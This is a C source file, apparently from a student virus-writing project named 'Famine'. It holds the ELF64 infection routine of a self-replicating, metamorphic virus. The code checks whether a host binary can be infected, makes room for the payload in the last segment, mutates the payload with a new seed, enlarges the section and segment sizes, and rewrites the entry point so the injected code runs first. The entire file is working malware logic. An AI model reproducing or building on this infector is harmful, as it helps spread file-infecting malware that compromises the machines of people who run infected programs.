/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   packer.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/19 00:59:29 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "infect.h"
#include "errors.h"

static bool	change_entry(const struct safe_pointer info, const struct entry *original_entry)
{
	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));

	if (!clone_hdr)  return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);

	const Elf64_Xword	sh_offset         = (original_entry->safe_shdr->sh_offset);
	const size_t		offset_in_section = original_entry->offset_in_section;
	const size_t		entry_off         = sh_offset + offset_in_section;
	const size_t		payload_offset    = original_entry->end_of_last_section;
	const Elf64_Xword	payload_distance  = payload_offset - entry_off;

	Elf64_Addr		e_entry = (clone_hdr->e_entry);

	e_entry += payload_distance;
	clone_hdr->e_entry = (e_entry);

	return true;
}

static bool	adjust_sizes(size_t shift_amount, const struct entry *clone_entry)
{
	const size_t	payload_size = _start - famine_entry;

	size_t		sh_size  = (clone_entry->safe_last_section_shdr->sh_size);
	Elf64_Xword	p_filesz = (clone_entry->safe_phdr->p_filesz);
	Elf64_Xword	p_memsz  = (clone_entry->safe_phdr->p_memsz);

	sh_size  += payload_size;
	p_filesz += shift_amount;
	p_memsz  += shift_amount;

	clone_entry->safe_last_section_shdr->sh_size = (sh_size);
	clone_entry->safe_phdr->p_filesz = (p_filesz);
	clone_entry->safe_phdr->p_memsz  = (p_memsz);

	return true;
}

static bool	define_shift_amount(const struct entry *original_entry, size_t *shift_amount)
{
	const size_t	p_filesz        = (original_entry->safe_phdr->p_filesz);
	const size_t	p_offset        = (original_entry->safe_phdr->p_offset);
	const size_t	segment_end     = p_offset + p_filesz;
	const size_t	payload_size    = _start - famine_entry;
	const size_t	segment_padding = segment_end - original_entry->end_of_last_section;

	if (payload_size < segment_padding)
	{
		*shift_amount = 0;
		return true;
	}

	const size_t	p_memsz = (original_entry->safe_phdr->p_memsz);
	const size_t	p_align = (original_entry->safe_phdr->p_align);

	*shift_amount = ALIGN(payload_size, SHIFT_ALIGNMENT);

	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;

	if (end_padding > p_align)
		return errors(ERR_VIRUS, _ERR_NOT_ENOUGH_PADDING);

	return true;
}

bool		elf64_packer(const struct famine food, size_t original_file_size, uint64_t seed[2])
{
	struct entry	original_entry;
	struct entry	clone_entry;
	size_t		shift_amount;
	uint64_t	son_seed[2];

	if (!find_entry(&original_entry, food.original_safe)
	|| !can_infect(&original_entry, food.original_safe)
	|| !define_shift_amount(&original_entry, &shift_amount)
	|| !metamorph_self(seed, son_seed)
	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
	|| !find_entry(&clone_entry, food.clone_safe)
	|| !adjust_sizes(shift_amount, &clone_entry)
	|| !setup_payload(&clone_entry, food.clone_safe, son_seed)
	|| !change_entry(food.clone_safe, &original_entry))
		return errors(ERR_THROW, _ERR_ELF64_PACKER);

	return true;
}
